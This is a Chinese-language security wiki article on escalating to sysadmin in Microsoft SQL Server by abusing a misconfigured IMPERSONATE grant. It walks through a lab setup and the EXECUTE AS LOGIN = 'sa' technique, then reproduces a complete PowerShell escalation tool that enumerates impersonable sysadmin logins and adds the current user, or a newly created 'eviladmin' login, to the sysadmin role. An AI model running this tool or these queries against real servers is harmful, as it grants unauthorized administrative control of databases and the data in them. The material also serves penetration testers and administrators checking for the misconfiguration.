Mssql 模拟登录提权
==================

0x01 前提
---------

开发者有时为了满足某种需求，允许其他登录用户模拟高权限的用户，对于开发来说，一个再简单不过的功能。虽然严格意义上这不算个漏洞，但是这种配置不当一般可以用来提权。

0x02 复现
---------

#### 1.sa用户登录创建4个用户

    -- Create login 1
    CREATE LOGIN MyUser1 WITH PASSWORD = 'MyPassword!';
    -- Create login 2
    CREATE LOGIN MyUser2 WITH PASSWORD = 'MyPassword!';
    -- Create login 3
    CREATE LOGIN MyUser3 WITH PASSWORD = 'MyPassword!';
    -- Create login 4
    CREATE LOGIN MyUser4 WITH PASSWORD = 'MyPassword!';

![1.png](/Users/aresx/Documents/VulWiki/.resource/Mssql模拟登录提权/media/rId24.png)

#### 2.赋予用户MyUser1权限来模拟 MyUser2, MyUser3,及sa

    USE master;
    GRANT IMPERSONATE ON LOGIN::sa to [MyUser1];
    GRANT IMPERSONATE ON LOGIN::MyUser2 to [MyUser1];
    GRANT IMPERSONATE ON LOGIN::MyUser3 to [MyUser1];
    GO

![2.png](/Users/aresx/Documents/VulWiki/.resource/Mssql模拟登录提权/media/rId26.png)

这里的GRANT IMPERSONATE ON
LOGIN意思是授权MyUser1用户对sa,MyUser2,MyUser3用户登录权限，查看sqlserver的文档`https://docs.microsoft.com/zh-cn/sql/t-sql/statements/grant-server-principal-permissions-transact-sql?view=sql-server-ver15`

![3.png](/Users/aresx/Documents/VulWiki/.resource/Mssql模拟登录提权/media/rId27.png)

在SQL Server的安全模型中，模拟（IMPERSONATE
）权限的安全对象是User或Login，被授予者（Grantee
）有权限模拟指定用户，在其安全上下文执行特定的操作。例如，user1授予模拟user2的权限，当user2的安全上下文有足够的权限，而user1没有时，通过权限模拟，user1能够在user2的权限上下文中执行查询请求：

    GRANT IMPERSONATE ON USER:: user2 TO user1;

通过执行EXECUTE AS
命令模拟用户的权限，用户user1就运行在user2的安全上下文中，例如，user1在登陆数据库之后，模拟user2的权限：

    EXECUTE AS USER = 'user2';

#### 3.查找可以模拟登录的用户

默认情况下，系统管理员可以模拟任何人，但是正常登录必须分配权限来模拟特定的用户，使用MyUser1用户登录，打开新建查询，执行下面语句查询那些用户可以用来模拟登录

    SELECT distinct b.name
    FROM sys.server_permissions a
    INNER JOIN sys.server_principals b
    ON a.grantor_principal_id = b.principal_id
    WHERE a.permission_name = 'IMPERSONATE'

![4.png](/Users/aresx/Documents/VulWiki/.resource/Mssql模拟登录提权/media/rId29.png)

这里我们可以看到MyUser1用户可以模拟登录sa,MyUser2,MyUser2用户，接下来就是模拟登录sa来获取sysadmin权限了

#### 4.模拟SQL Server用户登陆

    -- 验证是否为sysadmin权限
    SELECT SYSTEM_USER
    SELECT IS_SRVROLEMEMBER('sysadmin')
    -- 模拟sa登录
    EXECUTE AS LOGIN = 'sa'
    -- 验证是否为sysadmin权限
    SELECT SYSTEM_USER
    SELECT IS_SRVROLEMEMBER('sysadmin')

![5.png](/Users/aresx/Documents/VulWiki/.resource/Mssql模拟登录提权/media/rId31.png)

可以看到，第二个查询之后我们已经是sysadmin的权限了

我们再用查看登录用户来验证下

    SELECT * FROM master.sys.sysusers
    WHERE islogin = 1

模拟sa登录之前

![6.png](/Users/aresx/Documents/VulWiki/.resource/Mssql模拟登录提权/media/rId32.png)

模拟sa登录之后

![7.png](/Users/aresx/Documents/VulWiki/.resource/Mssql模拟登录提权/media/rId33.png)

权限高了，可以看到更多的用户登录

#### 5.回到原来的登录

    REVERT
    SELECT SYSTEM_USER
    SELECT IS_SRVROLEMEMBER('sysadmin')

![8.png](/Users/aresx/Documents/VulWiki/.resource/Mssql模拟登录提权/media/rId35.png)

这样我们又回到myuser1用户登录的会话了

0x03 工具化
-----------

> 当然这个也可以用powershell一键实现

### poc

> Invoke-SqlServer-Escalate-ExecuteAs.psm1

    function Invoke-SqlServer-Escalate-ExecuteAs
    {
        <#
        .SYNOPSIS
        This script can be used escalate privileges if the IMPERSONATION privilege has been assigned to the user.

        .DESCRIPTION
        This script can be used escalate privileges if the IMPERSONATION privilege has been assigned to the user.
        In most cases this results in additional data access, but in some cases it can be used to gain sysadmin
        privileges.  This script can also be used to add a new sysadmin instead of escalating the privileges of
        the existing user.  

        .EXAMPLE
        Adding the current user to the syadmin role if the user has permissions to impersonate the sa account.

        PS C:\> Invoke-SqlServer-Escalate-ExecuteAs -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS
        [*] Attempting to Connect to SQLServer\SQLEXPRESS as myappuser...
        [*] Connected.
        [*] Enumerating users that myappuser can impersonate...
        [*] 3 accounts can be impersonated:
        [*] - user2
        [*] - superuser
        [*] - sa
        [*] Checking if any of are sysadmins...
        [*] - user2 - NOT sysadmin
        [*] - superuser - NOT sysadmin
        [*] - sa - sysadmin!
        [*] Attempting to add myappuser to the sysadmin role via impersonation...
        [*] Verifying that myappuser was added to the sysadmin role...
        [*] Success! - myappuser is now a sysadmin.
        [*] All done.

        .EXAMPLE
        Creating a new sysadmin as a user with permissions to impersonate the sa account.

        PS C:\> Invoke-SqlServer-Escalate-ExecuteAs -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance SQLServer1\SQLEXPRESS -NewUser eviladmin -NewPass MyPassword!
        [*] Attempting to Connect to SQLServer\SQLEXPRESS as myappuser...
        [*] Connected.
        [*] Enumerating users that myappuser can impersonate...
        [*] 3 accounts can be impersonated:
        [*] - user2
        [*] - superuser
        [*] - sa
        [*] Checking if any of are sysadmins...
        [*] - user2 - NOT sysadmin
        [*] - superuser - NOT sysadmin
        [*] - sa - sysadmin!
        [*] Attempting to create and add eviladmin to the sysadmin role via impersonation...
        [*] Verifying that eviladmin was added to the sysadmin role...
        [*] Success! - eviladmin is now a sysadmin.
        [*] All done.

        .LINK
           http://www.netspi.com
           http://msdn.microsoft.com/en-us/library/ms178640.aspx

        .NOTES
           Author: Scott Sutherland - 2014, NetSPI
           Version: Invoke-SqlServer-Escalate-ExecuteAs.psm1 v1.0
           Comments: This should work on SQL Server 2005 and Above.
           
        .TODO
        fix double run bug
        fix alternative creds connection use
        #>

      [CmdletBinding()]
      Param(
        
        [Parameter(Mandatory=$false,
        HelpMessage='Set SQL Login username.')]
        [string]$SqlUser,
        
        [Parameter(Mandatory=$false,
        HelpMessage='Set SQL Login password.')]
        [string]$SqlPass,

        [Parameter(Mandatory=$false,
        HelpMessage='Set SQL Login username.')]
        [string]$NewUser,
        
        [Parameter(Mandatory=$false,
        HelpMessage='Set SQL Login password.')]
        [string]$NewPass,

        [Parameter(Mandatory=$false,
        HelpMessage='Execute query under impersonated user context.')]
        [string]$Query,

        [Parameter(Mandatory=$true,
        HelpMessage='Set target SQL Server instance.')]
        [string]$SqlServerInstance
        
      )

        # -----------------------------------------------
        # Setup database connection string
        # -----------------------------------------------
        
        # Create fun connection object
        $conn = New-Object System.Data.SqlClient.SqlConnection
        
        # Set authentication type and create connection string
        if($SqlUser){
        
            # SQL login / alternative domain credentials
             Write-Output "[*] Attempting to authenticate to $SqlServerInstance with SQL login $SqlUser..."
            $conn.ConnectionString = "Server=$SqlServerInstance;Database=master;User ID=$SqlUser;Password=$SqlPass;"
            [string]$ConnectUser = $SqlUser
        }else{
                
            # Trusted connection
            Write-Output "[*] Attempting to authenticate to $SqlServerInstance as the current Windows user..."
            $conn.ConnectionString = "Server=$SqlServerInstance;Database=master;Integrated Security=SSPI;"   
            $UserDomain = [Environment]::UserDomainName
            $Username = [Environment]::UserName
            $ConnectUser = "$UserDomain\$Username"                    
         }


        # -----------------------------------------------
        # Test database connection
        # -----------------------------------------------
        try{
            $conn.Open()
            Write-Host "[*] Connected." -foreground "green"
            $conn.Close()
        }catch{
            $ErrorMessage = $_.Exception.Message
            Write-Host "[*] Connection failed" -foreground "red"
            Write-Host "[*] Error: $ErrorMessage" -foreground "red"  
            Break
        }


        # -----------------------------------------------
        # Check if the user is already a sysadmin
        # -----------------------------------------------

        # Open db connection
        $conn.Open()

        # Setup query
        $Query = "select is_srvrolemember('sysadmin') as sysstatus"

        # Execute query
        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
        $results = $cmd.ExecuteReader() 

        # Parse query results
        $TableIsSysAdmin = New-Object System.Data.DataTable
        $TableIsSysAdmin.Load($results)  

        # Check if current user is a sysadmin
        $TableIsSysAdmin | Select-Object -First 1 sysstatus | foreach {

            $Checksysadmin = $_.sysstatus
            if ($Checksysadmin -ne 0){
                    Write-Host "[*] You're already a sysadmin - no escalation needed." -foreground "green"
                    Write-Host "[*] All Done."
                    Break             
            }
        }

        # Close db connection
        $conn.Close()

        # -----------------------------------------------
        # Get a list of the users that can be impersonated
        # -----------------------------------------------     
        
        # User status
        Write-Host "[*] Enumerating a list of users that can be impersonated..."  

        # Open db connection
        $conn.Open()

        # Setup query
        $QueryDatabases = "SELECT DISTINCT b.name
        FROM sys.server_permissions a
        INNER JOIN sys.server_principals b
        ON a.grantor_principal_id = b.principal_id 
        WHERE a.permission_name = 'IMPERSONATE'"

        # Execute query    
        $cmd = New-Object System.Data.SqlClient.SqlCommand($QueryDatabases,$conn)
        $results = $cmd.ExecuteReader()

        # Parse query results
        $TableImpUsers = New-Object System.Data.DataTable 
        $TableImpUsers.Load($results)

        # Check if any users can be impersonated
        if ($TableImpUsers.rows.count -eq 0){

        # Status user
        Write-Host "[*] Sorry, the current user doesn't have permissions to impersonate anyone." -foreground "red"
            Write-Host "[*] All done." 
            break
        }else{
            
            # Status user   
        $ImpUserCount = $TableImpUsers.rows.count      
        Write-Host "[*] Found $ImpUserCount users that can be impersonated:" 
        
        # Display users
            $TableImpUsers | foreach{
                $ImpUser = $_.name
                Write-Host "[*] - $ImpUser"
            }
        }

        # Close db connection
        $conn.Close() 

        # ----------------------------------------------------------------
        # Check if any of the users that can be impersonated are sysadmins
        # ----------------------------------------------------------------
        if ($TableImpUsers.rows.count -ne 0){   

            # Status user
            Write-Host "[*] Checking if any of them are sysadmins..."

            # Setup data table to store list of sysadmins that can be impersonated
            $TableImpUserSysAdmins = New-Object System.Data.DataTable
            $TableImpUserSysAdmins.Columns.Add('name') | Out-Null

            $TableImpUsers | foreach {
                
                # Open db connection
                $conn.Open()

                # Setup query
                $ImpUser = $_.name
                $Query = "select IS_SRVROLEMEMBER('sysadmin','$ImpUser') as status"

                # Execute query
            $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
            $results = $cmd.ExecuteReader()             

                # Parse query results
                $TableImpUserSysAdminsCheck = New-Object System.Data.DataTable 
                $TableImpUserSysAdminsCheck.Load($results)

                $TableImpUserSysAdminsCheck | foreach{
                $SysAdminStatus = $_.status
                }
                
                # Check if the impersonatable user is a sysadmin
                if ($SysAdminStatus -eq 0){
                    Write-Host "[*] - $ImpUser - NOT sysadmin" 
                }else{
                    Write-Host "[*] - $ImpUser - sysadmin!" -foreground "green"

                    # Add to data table
                    $TableImpUserSysAdmins.Rows.Add($ImpUser) | Out-Null     
                }

               # Clear check
               $TableImpUserSysAdminsCheck.Clear()

               # Close db connection
               $conn.Close()
            }
        }


        # -------------------------------------------------
        # Attempt to escalate privileges
        # -------------------------------------------------

        # Verify that a sysadmin user can be impersonated
        $ImpUserSysadminsCount = $TableImpUserSysAdmins.rows.count 
        if ($ImpUserSysadminsCount -ne 0) {        

            # Open db connection
            $conn.Open()

            # Check if we are going to add a new sysadmin or elevate the current one for query
            if ($newuser -and $newPass){
                $AddUser = "CREATE LOGIN $newuser WITH PASSWORD = '$newPass'"
                $UsertoElevate = $newuser
                $Message = " create and"
            }else{
                $AddUser = ""
                $UsertoElevate = $ConnectUser
                $Message = ""
            }

            # Status user
            Write-Host "[*] Attempting to$Message add $UsertoElevate to the sysadmin role via impersonation..."

            # Get the sysadmin user that can be impersonated
            $TableImpUserSysAdmins | foreach {
                $ImpUser = $_.name
            }

            # Setup query
            $Query = "EXECUTE AS Login = '$ImpUser';
            $AddUser;
            EXEC sp_addsrvrolemember '$UsertoElevate','sysadmin';
            SELECT IS_SRVROLEMEMBER('sysadmin','$UsertoElevate') as status;"

            # Execute query
            $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
            $results = $cmd.ExecuteReader() 

            # Status user
            Write-Host "[*] Verifying that $UsertoElevate was added to the sysadmin role..."

            # Parse query results
            $TableVerify = New-Object System.Data.DataTable
            $TableVerify.Load($results)  

            # Check if user is a sysadmin
            $TableVerify| Select-Object -First 1 status | foreach {

                $VerifySysadmin = $_.status
                if ($VerifySysadmin -eq 1){
                    Write-Host "[*] Success - $UsertoElevate is now a sysadmin!" -foreground "green"
                    Write-Host "[*] All Done."          
                }else{
                    Write-Host "[*] Failed - Something went wrong!." -foreground "red"
                    Write-Host "[*] All Done."
                } 
            }  

            # Close db connection
            $conn.Close()                        
        }else{
             Write-Host "[*] Sorry, the $ConnectUser account can't impersonate any sysadmins." -foreground "red" 
             Write-Host "[*] All done." 
        }  
        
    }

![9.png](/Users/aresx/Documents/VulWiki/.resource/Mssql模拟登录提权/media/rId38.png)

    Invoke-SqlServer-Escalate-ExecuteAs -SqlUser MyUser1 -SqlPass MyPassword! -SqlServerInstance WIN-80LVKKRM5UA

![10.png](/Users/aresx/Documents/VulWiki/.resource/Mssql模拟登录提权/media/rId39.png)

总的来说，利用这个来提权也不算是漏洞，毕竟可能是运维人员想要的正常功能，然后被攻击者利用，达到提权sysadmin的目的。
